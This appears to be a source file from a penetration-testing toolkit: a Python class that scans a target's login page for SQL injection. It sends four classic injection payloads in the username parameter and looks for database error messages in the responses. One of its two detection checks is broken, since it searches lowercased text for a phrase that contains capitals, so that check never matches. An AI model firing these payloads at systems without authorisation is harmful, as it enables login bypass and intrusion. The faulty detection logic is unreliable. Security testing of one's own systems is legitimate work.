# modules/scanners/sqli_scanner.py
from core.scanner_base import ScannerBase
from core.report_manager import ReportManager

class SQLIScanner(ScannerBase):
    def __init__(self, target):
        super().__init__(target)
        self.report = ReportManager("sqli_scan")

    def scan(self):
        print("""
        ╔════════════════════════════╗
        ║    💉 SQLi SCANNER 💉      ║
        ╚════════════════════════════╝
        """)
        
        print(f"[*] Scanning {self.target} for SQL Injection...")
        
        payloads = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "admin'--"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            test_url = f"{self.target}/login?username={payload}&password=test"
            print(f"[*] Testing payload: {payload[:20]}...")
            
            resp = self._send_request(test_url)
            if resp and ("error in your SQL" in resp.text.lower() or "syntax error" in resp.text.lower()):
                print(f"[!] Potential SQLi found with payload: {payload[:20]}...")
                self.report.add_result(f"SQLi Vulnerability: {test_url}")
                vulnerable = True
                
        if not vulnerable:
            print("[+] No SQL Injection vulnerabilities detected")
            self.report.add_result("No SQL Injection vulnerabilities found")
            
        self.report.save()
